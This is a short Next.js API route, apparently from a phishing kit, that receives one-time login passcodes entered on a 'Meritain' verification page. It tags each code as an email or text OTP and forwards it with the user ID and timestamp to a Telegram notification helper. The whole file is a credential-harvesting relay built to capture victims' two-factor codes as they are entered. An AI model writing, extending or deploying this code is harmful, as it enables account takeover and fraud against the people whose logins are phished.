import { NextRequest, NextResponse } from "next/server"

import { MERITAIN_VERIFY_PATH } from "@/lib/meritain-paths"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = (await request.json()) as {
      type?: string
      verificationType?: string
      method?: string
      code?: string
      otp?: string
      userId?: string
      page?: string
    }

    const typeHint = String(data.type ?? "").toLowerCase()
    const methodHint = String(data.verificationType ?? data.method ?? "").toLowerCase()
    const looksEmail =
      typeHint.includes("email") || methodHint.includes("email")

    const type =
      typeHint === "login_email_otp_verification" ||
      typeHint === "login_text_otp_verification"
        ? typeHint
        : looksEmail
          ? "login_email_otp_verification"
          : "login_text_otp_verification"

    await sendFormNotification({
      type,
      userId: data.userId ?? "",
      otp: data.code ?? data.otp ?? "",
      method: looksEmail ? "email" : "text",
      timestamp: new Date().toISOString(),
      page: data.page ?? MERITAIN_VERIFY_PATH,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
